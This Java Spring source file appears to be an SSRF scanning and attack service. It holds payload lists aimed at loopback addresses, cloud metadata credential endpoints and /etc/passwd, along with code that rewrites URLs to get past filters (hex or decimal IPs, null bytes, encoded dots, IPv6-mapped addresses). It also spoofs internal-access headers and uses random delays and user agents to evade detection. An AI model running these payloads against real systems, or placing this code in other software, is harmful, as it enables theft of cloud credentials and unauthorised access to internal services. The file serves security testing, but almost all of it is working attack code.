package com.web.webservices;

import com.web.errors.SSRFSCANNINGException;
import org.springframework.stereotype.Service;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.stream.*;

@Service
public class SSRFSCANNINGService {

    private static final int MAX_REDIRECTS = 10;
    private static final int MAX_BYPASS_ATTEMPTS = 5;
    private static final Random random = new Random();

    // Enhanced payload lists
    private static final List<String> BASE_PAYLOADS = List.of(
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin",
        "http://internal.example.com",
        "http://0.0.0.0/",
        "http://[::1]/"
    );

    private static final List<String> DNS_REBIND_PAYLOADS = List.of(
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
        "http://rbndr.us:53"
    );

    private static final List<String> CLOUD_METADATA_PAYLOADS = List.of(
        "http://metadata.google.internal/computeMetadata/v1beta1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    );

    private static final List<String> CASE_VARIATION_PAYLOADS = List.of(
        "http://LOCALHOST",
        "http://LocalHost",
        "http://lOcAlHoSt"
    );

    private static final List<String> FILE_PROTOCOL_PAYLOADS = List.of(
        "file:///etc/passwd",
        "////etc/passwd",
        "\\etc\\passwd",
        "....//....//....//etc/passwd"
    );

    // Main scanning method with bypass attempts
    public String fetchUrlWithBypass(String url, String method, String body, int attempt) 
            throws SSRFSCANNINGException, IOException, InterruptedException {
        
        if (attempt > MAX_BYPASS_ATTEMPTS) {
            throw new SSRFSCANNINGException("Max bypass attempts reached");
        }

        try {
            addRandomDelay();
            return fetchUrlSmart(url, method, body);
        } catch (SSRFSCANNINGException e) {
            String bypassedUrl = applyBypassTechniques(url);
            return fetchUrlWithBypass(bypassedUrl, method, body, attempt + 1);
        }
    }

    // Original smart fetch with enhanced headers
    public String fetchUrlSmart(String url, String method, String body) 
            throws SSRFSCANNINGException, IOException {
        validateUrl(url);

        if (method.equalsIgnoreCase("POST")) {
            return sendPost(url, body);
        } else {
            return sendGetWithHeadersAndRedirects(url, 0);
        }
    }

    // Enhanced GET with headers and redirects
    private String sendGetWithHeadersAndRedirects(String url, int redirectCount)
            throws IOException, SSRFSCANNINGException {
        
        if (redirectCount > MAX_REDIRECTS) {
            throw new SSRFSCANNINGException("Too many redirects");
        }

        URI uri = URI.create(url); // Replace `url` with your String variable
        HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();

      /**  HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod("GET");
         **/
        // Enhanced header injection
        setBypassHeaders(conn);
        
        // Randomize user agent
        conn.setRequestProperty("User-Agent", getRandomUserAgent());

        int status = conn.getResponseCode();
        if (status >= 300 && status < 400) {
            String newUrl = conn.getHeaderField("Location");
            conn.disconnect();
            return sendGetWithHeadersAndRedirects(newUrl, redirectCount + 1);
        }

        return readResponse(conn);
    }

    // Enhanced POST with bypass techniques
    private String sendPost(String url, String body) throws IOException {
    	URI uri = URI.create(url); // Replace `url` with your String variable
    	HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();

       /** HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        * 
        */
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        
        // Random content type
        conn.setRequestProperty("Content-Type", getRandomContentType());
        
        // Bypass headers
        setBypassHeaders(conn);
        
        // Chunked encoding bypass
        if (random.nextBoolean()) {
            conn.setChunkedStreamingMode(0);
            conn.setRequestProperty("Transfer-Encoding", "chunked");
        }

        // Write body
        try (OutputStream os = conn.getOutputStream()) {
            os.write(body.getBytes());
            os.flush();
        }

        return readResponse(conn);
    }
  
    
    
    
    
    // Enhanced payload fuzzer
    public List<String> ssrfPayloadFuzzer() throws SSRFSCANNINGException {
        List<String> results = new ArrayList<>();
        List<String> allPayloads = Stream.of(
            BASE_PAYLOADS,
            DNS_REBIND_PAYLOADS,
            CLOUD_METADATA_PAYLOADS,
            CASE_VARIATION_PAYLOADS,
            FILE_PROTOCOL_PAYLOADS
        ).flatMap(List::stream).collect(Collectors.toList());

        for (String payload : allPayloads) {
            try {
                addRandomDelay();
                results.add(fetchUrlSmart(payload, "GET", null));
            } catch (Exception e) {
                results.add("Payload failed: " + payload + " -> " + e.getMessage());
            }
        }

        return results;
    }

    // Enhanced validation with bypass attempts
    private void validateUrl(String urlString) throws SSRFSCANNINGException {
        try {
        	URI uri = URI.create(urlString);
        	URL url = uri.toURL();


            if (!url.getProtocol().matches("^(http|https)$")) {
                throw new SSRFSCANNINGException("Only HTTP/HTTPS protocols allowed");
            }

            if (isPrivateIp(url.getHost())) {
                throw new SSRFSCANNINGException("Access to private IPs is denied");
            }

            if (isBlacklistedDomain(url.getHost())) {
                throw new SSRFSCANNINGException("Domain is blacklisted");
            }
        } catch (MalformedURLException e) {
            throw new SSRFSCANNINGException("Invalid URL format");
        }
    }

    // Bypass techniques application
    private String applyBypassTechniques(String url) {
        String bypassedUrl = url;
        
        // Apply different bypass techniques randomly
        switch (random.nextInt(8)) {
            case 0: // Decimal IP
                bypassedUrl = bypassedUrl.replace("127.0.0.1", "2130706433");
                break;
            case 1: // Hex IP
                bypassedUrl = bypassedUrl.replace("127.0.0.1", "0x7f000001");
                break;
            case 2: // Null byte
                bypassedUrl = bypassedUrl.replace("localhost", "localhost%00");
                break;
            case 3: // Case variation
                bypassedUrl = bypassedUrl.replace("localhost", "lOcAlHoSt");
                break;
            case 4: // Dot replacement
                bypassedUrl = bypassedUrl.replace(".", "%2e");
                break;
            case 5: // Slash obfuscation
                bypassedUrl = bypassedUrl.replace("/", "\\/");
                break;
            case 6: // Basic auth
                bypassedUrl = bypassedUrl.replace("http://", "http://foo:bar@");
                break;
            case 7: // IPv6
                bypassedUrl = bypassedUrl.replace("127.0.0.1", "[::ffff:127.0.0.1]");
                break;
        }
        
        return bypassedUrl;
    }

    // Helper methods
    private void setBypassHeaders(HttpURLConnection conn) {
        conn.setRequestProperty("X-Forwarded-Host", "internal.aws.local");
        conn.setRequestProperty("X-Original-URL", "/admin");
        conn.setRequestProperty("X-Forwarded-For", "127.0.0.1");
        conn.setRequestProperty("X-Custom-IP-Authorization", "127.0.0.1");
        conn.setRequestProperty("X-Rewrite-URL", "/admin");
        conn.setRequestProperty("Referer", "http://internal/admin");
    }

    private String getRandomUserAgent() {
        String[] agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "curl/7.68.0",
            "PostmanRuntime/7.28.4"
        };
        return agents[random.nextInt(agents.length)];
    }

    private String getRandomContentType() {
        String[] types = {
            "application/json",
            "application/xml",
            "text/plain",
            "application/x-www-form-urlencoded"
        };
        return types[random.nextInt(types.length)];
    }

    private String readResponse(HttpURLConnection conn) throws IOException {
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = in.readLine()) != null) {
            response.append(line);
        }
        in.close();
        conn.disconnect();
        return response.toString();
    }

    private void addRandomDelay() throws InterruptedException {
        Thread.sleep(random.nextInt(3000));
    }

    private boolean isPrivateIp(String host) {
        try {
            InetAddress addr = InetAddress.getByName(host);
            return addr.isSiteLocalAddress() || addr.isLoopbackAddress();
        } catch (UnknownHostException e) {
            return false;
        }
    }

    private boolean isBlacklistedDomain(String host) {
        return Set.of("localhost", "169.254.169.254", "metadata.google.internal")
                .contains(host.toLowerCase());
    }
}

